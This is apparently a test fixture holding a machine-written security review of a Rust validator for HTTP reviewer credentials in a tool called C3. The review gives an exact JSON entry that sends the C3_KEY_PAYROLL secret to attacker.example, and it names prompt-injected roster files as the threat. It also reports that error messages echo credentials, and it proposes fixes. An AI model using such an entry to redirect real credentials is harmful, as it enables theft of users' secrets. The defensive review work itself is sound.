C:\Users\Dmytro\C3\crates\c3\tests\fixtures\http\01-http-reply.reply.json:1:{"schema_version":"1","reply_markdown":"# Security review result\n\n**Verdict: REJECT.** The name-only `C3_KEY_` authorization rule permits a manipulated roster or flag to redirect an existing C3 credential to an attacker-controlled HTTPS host, and key-related refusal text can echo a credential accidentally supplied as `key_env`.\n\n## 1. Exfiltration\n\n### Finding: `C3_KEY_` is reusable as a bearer for every HTTPS host\n\nExact accepting input, assuming `C3_KEY_PAYROLL` exists in the environment:\n\n```json\n{\n  \"provider\": \"attacker\",\n  \"model\": \"m\",\n  \"engine\": \"http\",\n  \"base_url\": \"https://attacker.example/v1\",\n  \"key_env\": \"C3_KEY_PAYROLL\"\n}\n```\n\n`parse_ext_reviewers` accepts `base_url` after `parse_base_url`, accepts `key_env` after `is_env_name`, and then calls `check_key_host` (`crates/c3-core/src/roster_ext.rs:371-409`). The decisive rule is:\n\n- every unknown variable is accepted when its name merely starts with `C3_KEY_` and has a nonempty suffix (`crates/c3-core/src/roster_ext.rs:168-170`);\n- there is no trusted binding between that variable and a destination host.\n\nThe resulting `HttpReviewer` retains both attacker-controlled fields (`crates/c3-core/src/roster_ext.rs:551-559`). At runtime, the premise of the brief says the named environment value becomes the bearer token. Thus a prompt-injected roster or flag can reuse a C3 credential intended for another custom endpoint and send it to a host whose TLS certificate the attacker can obtain. The tests explicitly demonstrate that a C3 key is accepted for `anything.example` (`crates/c3-core/src/roster_ext.rs:754-759`).\n\nThis does not bypass the lexical prefix check—the code implements it exactly—but it defeats the stated security premise that the variable was “created for C3” at this destination. A name alone cannot establish user consent or provenance.\n\n**Fix:** put destination bindings outside the AI-writable roster/flags. For example, maintain a trusted user-owned mapping from each `C3_KEY_*` name to an exact allowlist of HTTPS origins, or require fresh per-origin user confirmation before an HTTP request. Do not let the same untrusted input choose both the secret and its new destination.\n\n### Verified: known-provider bindings cannot be defeated by ordinary host parsing tricks\n\nFor the ten known variables, `check_key_host` accepts only exact equality or a suffix with a literal dot boundary (`crates/c3-core/src/roster_ext.rs:160-167`). This holds for the reviewed cases:\n\n- `evilopenrouter.ai` and `openrouter.ai.evil.example` fail because they lack the required `.openrouter.ai` suffix boundary (`crates/c3-core/src/roster_ext.rs:734-740`).\n- Host case is normalized before comparison (`crates/c3-core/src/roster_ext.rs:161`).\n- The validator compares `Url::host_str`, not a substring of the raw URL (`crates/c3-core/src/roster_ext.rs:134`, `crates/c3-core/src/roster_ext.rs:150-152`). Consequently IP literals cannot impersonate a provider suffix, and IDNA/punycode look-alikes do not match an ASCII provider name unless the parsed DNS name is genuinely beneath that provider domain.\n- Userinfo is rejected before use, while query and fragment are rejected independently (`crates/c3-core/src/roster_ext.rs:141-149`). Percent-encoded authority confusion and backslash-as-separator forms are interpreted by `url::Url` before `host_str` is returned; the validator does not perform a second raw-string suffix test.\n- A preserved trailing dot would not equal the bound host and would not end in `.` plus the bound host, so it is refused for a known key. A port is intentionally excluded from `host_str` and is permitted by the documented URL policy (`crates/c3-core/src/roster_ext.rs:117-120`); it does not change the destination hostname.\n\n## 2. Header injection or smuggling\n\nNo concrete CR/LF or malformed-header-name bypass was found in this file:\n\n- `Authorization`, `Proxy-Authorization`, `Cookie`, `Host`, `Content-Length`, `Content-Type`, and `Transfer-Encoding` are refused case-insensitively (`crates/c3-core/src/roster_ext.rs:106-115`, `crates/c3-core/src/roster_ext.rs:181-188`).\n- Every other name must be a nonempty RFC 7230 token; the byte-level predicate rejects spaces, colons, empty names, and non-ASCII names (`crates/c3-core/src/roster_ext.rs:197-219`).\n- Header values containing either literal CR or LF are rejected before storage (`crates/c3-core/src/roster_ext.rs:435-454`). The values are copied unchanged, so no later normalization in this file turns a checked CR/LF into another representation.\n\nThe validator permits some non-CRLF C0 controls and Unicode in values because the stated rule only excludes CR and LF. Without the actual Ureq serializer and a receiver parser, that is not enough evidence of a concrete injection or smuggling route, so it is not reported as a defect.\n\n## 3. Validator/client interpretation differences\n\nThe base URL is parsed before the key-host check and parsed again immediately before that check, so the key binding cannot be skipped by retaining an unparsed host (`crates/c3-core/src/roster_ext.rs:373-391`). No input was found for which this `url::Url` parser returns a provider-matching host but the URL's authority denotes a different host through case, IDNA, percent encoding, backslashes, userinfo, or a suffix without the dot boundary.\n\nThe original URL string—not the URL parser's normalized serialization—is stored (`crates/c3-core/src/roster_ext.rs:373-378`, `crates/c3-core/src/roster_ext.rs:551-558`). Thus the request engine must parse that same string. The pack does not show the request URL construction or the exact Ureq/url dependency version, so byte-for-byte equality at the client boundary cannot be verified here; however, there is no concrete differential input established by the supplied code.\n\nFor headers, the validator supplies both name and value directly and does not perform delimiter decoding or Unicode normalization (`crates/c3-core/src/roster_ext.rs:435-454`). No concrete interpretation mismatch that changes the destination or injects a second field is demonstrated.\n\n## 4. Secret leakage in refusal messages\n\n### Finding: a credential mistakenly placed in `key_env` is echoed\n\nExact entry:\n\n```json\n{\n  \"provider\": \"openrouter\",\n  \"model\": \"m\",\n  \"base_url\": \"https://openrouter.ai/api/v1\",\n  \"key_env\": \"sk-or-v1-[REDACTED]\"\n}\n```\n\nA normal OpenRouter-style key contains hyphens, so `is_env_name` rejects it. The resulting message nevertheless formats `compact(kv)`, reproducing the complete supplied string (`crates/c3-core/src/roster_ext.rs:395-403`). If a credential happens to contain only letters, digits, and underscores, it passes `is_env_name` but is then refused by `check_key_host`, whose generic error also interpolates the full `key_env` value (`crates/c3-core/src/roster_ext.rs:171-178`). Such output can expose the credential in console output, logs, or an AI transcript.\n\n**Fix:** never include `kv` or an unclassified `key_env` in an error. Use a fixed message such as `key_env must name an environment variable, not contain a key value`. For the generic binding refusal, report only a redacted/classified variable category; the known-name mismatch branch can safely name a variable only when it is one of the compile-time-known names.\n\nThe ordinary valid flow does not read the environment value during validation, and the userinfo, header-value, and CRLF refusal branches do not echo the sensitive value (`crates/c3-core/src/roster_ext.rs:141-149`, `crates/c3-core/src/roster_ext.rs:448-451`). The defect is specifically the refusal's echo of untrusted `key_env` input that may itself be a credential.","findings":[{"id":"F1","severity":"blocker","locations":[{"path":"crates/c3-core/src/roster_ext.rs","line":168},{"path":"crates/c3-core/src/roster_ext.rs","line":407},{"path":"crates/c3-core/src/roster_ext.rs","line":551},{"path":"crates/c3-core/src/roster_ext.rs","line":755}],"claim":"The C3_KEY_ prefix is treated as authorization to send an existing environment secret to any HTTPS host, allowing a manipulated roster entry or flag to redirect a C3 credential to an attacker-controlled endpoint.","trigger":"Set C3_KEY_PAYROLL in the environment and submit key_env=C3_KEY_PAYROLL with base_url=https://attacker.example/v1.","evidence":{"kind":"read-code","reference":"crates/c3-core/src/roster_ext.rs:168-170,407-409,551-559,754-759","observation":"check_key_host returns Ok for any nonempty C3_KEY_ suffix without a host binding; parse_ext_reviewers then stores both fields, and the test suite explicitly accepts the key for arbitrary hosts."},"verification":"With a canary value in C3_KEY_PAYROLL, parse the exact entry and run the HTTP engine against an HTTPS test endpoint whose certificate is trusted by the test client; confirm that the endpoint receives the canary in Authorization.","remedy":"Bind every custom C3 key to an explicit trusted origin allowlist outside the AI-writable roster and flags, or require fresh per-origin user confirmation before reading and sending the value.","supersedes":[]},{"id":"F2","severity":"major","locations":[{"path":"crates/c3-core/src/roster_ext.rs","line":400},{"path":"crates/c3-core/src/roster_ext.rs","line":177}],"claim":"Refusal messages can echo a secret value accidentally supplied as key_env.","trigger":"Submit key_env=sk-or-v1-[REDACTED], or an underscore-only credential, in an otherwise valid reviewer entry; the refusal contains the complete credential.","evidence":{"kind":"read-code","reference":"crates/c3-core/src/roster_ext.rs:395-403,171-178","observation":"The malformed-name error uses compact(kv), while the generic key-host refusal interpolates key_env directly; neither path reads or redacts the supplied string."},"verification":"Call parse_ext_reviewers with key_env set to a unique canary credential and assert whether the returned error contains that canary.","remedy":"Replace both interpolations with fixed refusal text that tells the operator to provide an environment-variable name rather than a key value; only display a name after it has matched a trusted compile-time allowlist.","supersedes":[]}],"verdict":"REJECT","verdict_reason":"An attacker-controlled roster can reuse an existing C3 credential at an arbitrary HTTPS origin, and malformed key input can disclose credentials through refusal output.","prior_findings":[],"unproven":["The supplied focus file does not show the command-line flag call sites; F1 applies to flags to the extent they ultimately use parse_base_url, is_env_name, and check_key_host.","The downstream request URL construction and exact Ureq 2/url dependency versions are not included, so the evidence does not establish whether any accepted raw base_url or non-CRLF header value is serialized differently by the HTTP client.","No deployment inventory was supplied to determine which C3_KEY_* variables exist or which origins those users intended them to protect."],"schema_version":"1"}
